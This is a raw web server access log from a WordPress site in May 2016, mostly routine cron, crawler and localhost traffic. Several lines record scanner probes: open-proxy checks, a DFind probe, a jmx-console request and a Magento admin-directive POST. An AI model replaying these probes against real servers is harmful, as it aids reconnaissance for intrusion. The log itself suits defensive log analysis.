109.163.234.9 - - [02/May/2016:00:40:50 +0000] "GET /wp-content/themes/nuntius/images/bg-container.png HTTP/1.1" 200 384 "http://ndecriaumuyf5kil.onion/" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1"
109.163.234.9 - - [02/May/2016:00:40:50 +0000] "GET /wp-includes/images/smilies/icon_wink.gif HTTP/1.1" 200 452 "http://ndecriaumuyf5kil.onion/" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1"
109.163.234.9 - - [02/May/2016:00:40:50 +0000] "GET /wp-content/themes/nuntius/images/bg-sidebar-search-form.png HTTP/1.1" 200 523 "http://ndecriaumuyf5kil.onion/" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1"
52.31.166.88 - - [02/May/2016:00:40:47 +0000] "POST /wp-cron.php?doing_wp_cron=1462149647.6431779861450195312500 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
::1 - - [02/May/2016:00:40:56 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
161.202.90.202 - - [02/May/2016:01:58:10 +0000] "GET /feed/ HTTP/1.1" 404 440 "-" "-"
127.0.0.1 - - [02/May/2016:02:09:57 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [02/May/2016:03:09:28 +0000] "GET / HTTP/1.1" 200 5852 "-" "Scrapy/1.0.5 (+http://scrapy.org)"
127.0.0.1 - - [02/May/2016:05:06:55 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
92.222.246.137 - - [02/May/2016:06:06:53 +0000] "GET /xmlrpc.php HTTP/1.1" 200 268 "-" "-"
92.222.246.137 - - [02/May/2016:06:06:53 +0000] "GET /feed/ HTTP/1.1" 404 440 "-" "-"
127.0.0.1 - - [02/May/2016:07:06:43 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
185.25.151.159 - - [02/May/2016:07:51:18 +0000] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [02/May/2016:08:06:42 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [02/May/2016:10:06:44 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [02/May/2016:11:23:07 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [02/May/2016:12:06:54 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
80.82.78.38 - - [02/May/2016:13:21:34 +0000] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 459 "-" "Mozilla"
91.196.50.33 - - [02/May/2016:13:54:16 +0000] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [02/May/2016:14:23:51 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
52.31.166.88 - - [02/May/2016:14:23:51 +0000] "POST /wp-cron.php?doing_wp_cron=1462199031.7532219886779785156250 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
69.197.185.22 - - [02/May/2016:15:41:03 +0000] "GET / HTTP/1.1" 200 15606 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
127.0.0.1 - - [02/May/2016:17:07:16 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [02/May/2016:18:06:42 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
185.93.185.252 - - [02/May/2016:18:47:02 +0000] "GET / HTTP/1.1" 200 15625 "-" "Research scan, mail networkresearch@yandex.ru"
127.0.0.1 - - [02/May/2016:20:22:17 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [02/May/2016:21:06:47 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
185.103.252.170 - - [02/May/2016:21:21:41 +0000] "GET /feed/ HTTP/1.1" 404 440 "-" "-"
127.0.0.1 - - [02/May/2016:23:23:03 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [03/May/2016:01:29:37 +0000] "GET / HTTP/1.1" 200 5852 "-" "Scrapy/1.0.5 (+http://scrapy.org)"
52.31.166.88 - - [03/May/2016:01:29:37 +0000] "POST /wp-cron.php?doing_wp_cron=1462238977.4197978973388671875000 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
127.0.0.1 - - [03/May/2016:02:06:52 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [03/May/2016:03:06:42 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [03/May/2016:05:24:05 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
185.25.151.159 - - [03/May/2016:06:43:12 +0000] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
141.212.122.145 - - [03/May/2016:06:53:12 +0000] "GET / HTTP/1.1" 301 274 "-" "Go http package"
141.212.122.145 - - [03/May/2016:06:53:12 +0000] "GET / HTTP/1.1" 200 5833 "http://52.31.166.88:80" "Go http package"
127.0.0.1 - - [03/May/2016:08:07:09 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
5.206.88.106 - - [03/May/2016:08:23:15 +0000] "GET http://env.darkbyte.ru/?uUABYph80 HTTP/1.1" 301 307 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
61.216.2.13 - - [03/May/2016:08:57:48 +0000] "-" 408 0 "-" "-"
127.0.0.1 - - [03/May/2016:09:06:43 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [03/May/2016:10:06:42 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [03/May/2016:11:23:26 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [03/May/2016:12:06:44 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
91.196.50.33 - - [03/May/2016:13:04:43 +0000] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [03/May/2016:14:06:43 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
52.31.166.88 - - [03/May/2016:14:06:43 +0000] "POST /wp-cron.php?doing_wp_cron=1462284403.9184188842773437500000 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
64.16.209.235 - - [03/May/2016:16:14:49 +0000] "POST /admin/Cms_Wysiwyg/directive/index/?___directive=&filter=&forwarded=1 HTTP/1.0" 404 518 "-" "-"
127.0.0.1 - - [03/May/2016:17:18:45 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
107.150.32.62 - - [03/May/2016:19:06:16 +0000] "GET / HTTP/1.1" 200 15606 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
127.0.0.1 - - [03/May/2016:19:06:44 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [03/May/2016:20:20:32 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [03/May/2016:23:18:13 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [04/May/2016:01:06:43 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
52.31.166.88 - - [04/May/2016:01:06:43 +0000] "POST /wp-cron.php?doing_wp_cron=1462324003.9547009468078613281250 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
127.0.0.1 - - [04/May/2016:02:07:10 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [04/May/2016:03:06:47 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [04/May/2016:05:06:52 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [04/May/2016:06:06:48 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
80.82.78.38 - - [04/May/2016:06:47:45 +0000] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 459 "-" "Mozilla"
127.0.0.1 - - [04/May/2016:07:06:45 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [04/May/2016:08:06:51 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [04/May/2016:09:06:51 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [04/May/2016:10:06:50 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
185.25.148.240 - - [04/May/2016:12:22:14 +0000] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [04/May/2016:13:06:44 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
52.31.166.88 - - [04/May/2016:13:06:44 +0000] "POST /wp-cron.php?doing_wp_cron=1462367204.6380379199981689453125 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
52.31.166.88 - - [04/May/2016:14:24:19 +0000] "POST /wp-cron.php?doing_wp_cron=1462371859.0246779918670654296875 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
127.0.0.1 - - [04/May/2016:14:24:19 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [04/May/2016:17:20:13 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
103.28.58.68 - - [04/May/2016:17:22:52 +0000] "GET /jmx-console/ HTTP/1.0" 404 496 "-" "-"
42.159.144.101 - - [04/May/2016:17:31:56 +0000] "GET http://g-ecx.images-amazon.com/images/G/01/x-locale/common/transparent-pixel._CB386942464_.gif HTTP/1.0" 404 528 "-" "-"
127.0.0.1 - - [04/May/2016:21:06:49 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [05/May/2016:01:06:44 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
52.31.166.88 - - [05/May/2016:01:06:44 +0000] "POST /wp-cron.php?doing_wp_cron=1462410404.8556330204010009765625 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
127.0.0.1 - - [05/May/2016:01:11:43 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
198.20.69.74 - - [05/May/2016:04:35:34 +0000] "GET / HTTP/1.1" 200 15606 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36"
198.20.69.74 - - [05/May/2016:04:35:35 +0000] "GET /robots.txt HTTP/1.1" 404 445 "-" "-"
198.20.69.74 - - [05/May/2016:04:35:35 +0000] "GET /sitemap.xml HTTP/1.1" 404 446 "-" "-"
127.0.0.1 - - [05/May/2016:05:07:09 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [05/May/2016:06:06:51 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [05/May/2016:07:06:54 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [05/May/2016:08:06:50 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [05/May/2016:11:07:12 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [05/May/2016:12:06:55 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
185.25.151.159 - - [05/May/2016:12:20:59 +0000] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [05/May/2016:13:06:48 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
52.31.166.88 - - [05/May/2016:13:06:48 +0000] "POST /wp-cron.php?doing_wp_cron=1462453608.7176930904388427734375 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
52.31.166.88 - - [05/May/2016:14:21:00 +0000] "POST /wp-cron.php?doing_wp_cron=1462458060.8978230953216552734375 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
127.0.0.1 - - [05/May/2016:14:21:00 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [05/May/2016:15:06:54 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [05/May/2016:17:06:56 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [05/May/2016:19:06:48 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [05/May/2016:20:06:55 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
106.184.3.122 - - [05/May/2016:21:57:56 +0000] "\x16\x03\x01" 400 0 "-" "-"
106.184.3.122 - - [05/May/2016:21:57:58 +0000] "SSH-2.0-LYGhost_1.2.7-20100630" 200 15327 "-" "-"
169.54.233.117 - - [05/May/2016:22:13:07 +0000] "GET / HTTP/1.0" 200 15577 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
94.102.48.195 - - [05/May/2016:22:17:50 +0000] "GET /robots.txt HTTP/1.0" 404 494 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
5.196.125.98 - - [05/May/2016:22:43:24 +0000] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 0 "-" "-"
127.0.0.1 - - [05/May/2016:23:19:29 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
80.82.78.38 - - [06/May/2016:00:15:16 +0000] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 459 "-" "Mozilla"
127.0.0.1 - - [06/May/2016:01:32:54 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
52.31.166.88 - - [06/May/2016:01:32:54 +0000] "POST /wp-cron.php?doing_wp_cron=1462498374.8683979511260986328125 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
127.0.0.1 - - [06/May/2016:02:06:53 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [06/May/2016:03:31:18 +0000] "GET / HTTP/1.1" 200 5852 "-" "Scrapy/1.0.5 (+http://scrapy.org)"
127.0.0.1 - - [06/May/2016:04:06:53 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
52.31.166.88 - - [06/May/2016:04:06:53 +0000] "POST /wp-cron.php?doing_wp_cron=1462507613.0236229896545410156250 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
127.0.0.1 - - [06/May/2016:05:07:15 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
199.115.117.118 - - [06/May/2016:08:00:14 +0000] "GET /recordings/theme/iefixes.css HTTP/1.1" 404 519 "-" "python-requests/2.8.0"
118.193.27.7 - - [06/May/2016:08:38:56 +0000] "\x16\x03\x01\x01\"\x01" 400 0 "-" "-"
118.193.27.7 - - [06/May/2016:08:39:00 +0000] "GET / HTTP/1.1" 301 274 "-" "-"
52.31.166.88 - - [06/May/2016:08:39:00 +0000] "POST /wp-cron.php?doing_wp_cron=1462523940.2034280300140380859375 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
127.0.0.1 - - [06/May/2016:11:07:04 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
52.31.166.88 - - [06/May/2016:11:07:04 +0000] "POST /wp-cron.php?doing_wp_cron=1462532824.1398720741271972656250 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
222.85.138.75 - - [06/May/2016:11:14:09 +0000] "-" 408 0 "-" "-"
92.63.131.5 - - [06/May/2016:11:30:08 +0000] "GET / HTTP/1.1" 200 15606 "-" "curl/7.45.0"
185.25.148.240 - - [06/May/2016:12:00:05 +0000] "GET http://testp1.piwo.pila.pl/testproxy.php HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
141.212.122.193 - - [06/May/2016:12:31:14 +0000] "GET / HTTP/1.1" 301 274 "-" "Go http package"
141.212.122.193 - - [06/May/2016:12:31:14 +0000] "GET / HTTP/1.1" 200 5833 "http://52.31.166.88:80" "Go http package"
127.0.0.1 - - [06/May/2016:14:07:03 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
52.31.166.88 - - [06/May/2016:14:07:03 +0000] "POST /wp-cron.php?doing_wp_cron=1462543623.1472620964050292968750 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
127.0.0.1 - - [06/May/2016:15:06:51 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [06/May/2016:17:06:53 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
52.31.166.88 - - [06/May/2016:17:06:53 +0000] "POST /wp-cron.php?doing_wp_cron=1462554413.5234980583190917968750 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
127.0.0.1 - - [06/May/2016:19:06:58 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
52.31.166.88 - - [06/May/2016:19:06:58 +0000] "POST /wp-cron.php?doing_wp_cron=1462561618.1554920673370361328125 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
127.0.0.1 - - [06/May/2016:20:07:02 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [06/May/2016:23:07:28 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
52.31.166.88 - - [06/May/2016:23:07:32 +0000] "POST /wp-admin/upgrade.php?step=upgrade_db HTTP/1.0" 200 299 "-" "WordPress/4.0.10; http://52.31.166.88"
52.31.166.88 - - [06/May/2016:23:07:28 +0000] "POST /wp-cron.php?doing_wp_cron=1462576048.3890988826751708984375 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
127.0.0.1 - - [07/May/2016:00:06:51 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
173.208.197.251 - - [07/May/2016:00:07:15 +0000] "GET / HTTP/1.1" 200 15606 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
74.91.20.195 - - [07/May/2016:00:10:33 +0000] "GET / HTTP/1.1" 200 15606 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
107.150.32.58 - - [07/May/2016:00:57:27 +0000] "GET / HTTP/1.1" 200 15606 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
52.31.166.88 - - [07/May/2016:00:57:27 +0000] "POST /wp-cron.php?doing_wp_cron=1462582647.2240359783172607421875 HTTP/1.0" 200 187 "-" "WordPress/4.0.11; http://52.31.166.88"
127.0.0.1 - - [07/May/2016:01:06:51 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [07/May/2016:02:06:59 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [07/May/2016:03:06:54 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
169.229.3.91 - - [07/May/2016:08:05:02 +0000] "\x80I\x9b" 200 15327 "-" "-"
127.0.0.1 - - [07/May/2016:08:06:57 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [07/May/2016:10:06:56 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [07/May/2016:11:07:13 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
91.196.50.33 - - [07/May/2016:12:05:46 +0000] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [07/May/2016:12:06:53 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [07/May/2016:15:06:53 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
52.31.166.88 - - [07/May/2016:15:06:53 +0000] "POST /wp-cron.php?doing_wp_cron=1462633613.9406609535217285156250 HTTP/1.0" 200 187 "-" "WordPress/4.0.11; http://52.31.166.88"
80.82.78.38 - - [07/May/2016:17:46:55 +0000] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 459 "-" "Mozilla"
127.0.0.1 - - [07/May/2016:18:06:52 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [07/May/2016:23:07:19 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [08/May/2016:01:07:01 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
52.31.166.88 - - [08/May/2016:01:07:01 +0000] "POST /wp-cron.php?doing_wp_cron=1462669621.3642799854278564453125 HTTP/1.0" 200 187 "-" "WordPress/4.0.11; http://52.31.166.88"
222.186.21.44 - - [08/May/2016:01:39:44 +0000] "GET /script HTTP/1.1" 404 497 "-" "python-requests/2.7.0 CPython/2.7.0 Windows/2003Server"
127.0.0.1 - - [08/May/2016:03:06:55 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
91.196.50.33 - - [08/May/2016:04:17:44 +0000] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
198.20.87.98 - - [08/May/2016:04:44:07 +0000] "GET / HTTP/1.1" 200 15606 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36"
